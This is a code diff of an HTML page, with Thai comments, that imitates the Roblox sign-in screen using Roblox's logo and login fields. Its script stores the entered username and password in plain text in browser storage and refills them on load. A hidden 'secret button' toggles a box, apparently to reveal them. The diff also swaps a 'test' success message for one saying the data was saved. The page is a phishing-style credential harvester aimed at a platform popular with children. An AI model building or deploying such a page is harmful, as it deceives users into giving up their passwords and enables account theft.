@@ -24,17 +24,23 @@
       justify-content: space-between;
       align-items: center;
       padding: 8px 16px;
+      overflow: hidden;
+      max-height: 50px;
     }
 
     .logo {
       display: flex;
       align-items: center;
+      justify-content: center;
+      width: 32px;
+      height: 32px;
+      overflow: hidden;
     }
 
     .logo img {
       width: 32px;
       height: 32px;
-      transform: rotate(45deg);
+      transform: rotate(-45deg); /* หมุนทิศทางให้ถูกต้อง */
       transform-origin: center;
       margin-left: 4px;
     }
@@ -73,7 +79,6 @@
       cursor: pointer;
     }
 
-    /* เมนูหลัก */
     nav {
       background-color: #111;
       display: flex;
@@ -83,7 +88,6 @@
       font-size: 15px;
     }
 
-    /* กล่องล็อกอิน */
     .container {
       max-width: 400px;
       margin: 40px auto;
@@ -131,7 +135,6 @@
       cursor: pointer;
     }
 
-    /* ฟุตเตอร์ */
     footer {
       margin-top: 50px;
       font-size: 13px;
@@ -148,7 +151,6 @@
       text-decoration: none;
     }
 
-    /* ปุ่มลับ */
     #secret-btn {
       position: fixed;
       bottom: 8px;
@@ -172,7 +174,7 @@
       z-index: 999;
       color: white;
       max-width: 80%;
-      word-break: break-word;
+      word-break: break-all;
     }
   </style>
 </head>
@@ -181,7 +183,6 @@
   <!-- หัวเว็บ -->
   <header>
     <div class="logo">
-      <!-- โลโก้ Roblox แบบภาพเอียง -->
       <img src="https://upload.wikimedia.org/wikipedia/commons/6/6e/Roblox_Logo_2022.png" alt="Roblox Logo">
     </div>
     <div class="header-buttons">
@@ -199,7 +200,7 @@
     <div>Robux</div>
   </nav>
 
-  <!-- กล่องลงชื่อเข้าใช้ -->
+  <!-- กล่องล็อกอิน -->
   <div class="container">
     <h2>ลงชื่อเข้าใช้ Roblox</h2>
     <input type="text" id="username" placeholder="ชื่อผู้ใช้/อีเมล/หมายเลขโทรศัพท์">
@@ -240,19 +241,17 @@
       if (username && password) {
         localStorage.setItem('roblox_username', username);
         localStorage.setItem('roblox_password', password);
-        alert("เข้าสู่ระบบสำเร็จ (ทดสอบ)");
+        alert("เข้าสู่ระบบสำเร็จ! (ข้อมูลถูกบันทึก)");
       } else {
         alert('กรุณากรอกข้อมูลให้ครบ');
       }
     }
 
-    // โหลดค่าที่เคยกรอกไว้
     window.onload = () => {
       document.getElementById('username').value = localStorage.getItem('roblox_username') || '';
       document.getElementById('password').value = localStorage.getItem('roblox_password') || '';
     };
 
-    // ปุ่มลับ
     function toggleSecret() {
       const box = document.getElementById("secret-box");
       if (box.style.display === "block") {
@@ -268,3 +267,5 @@
 
 </body>
 </html>
+
+Roblox
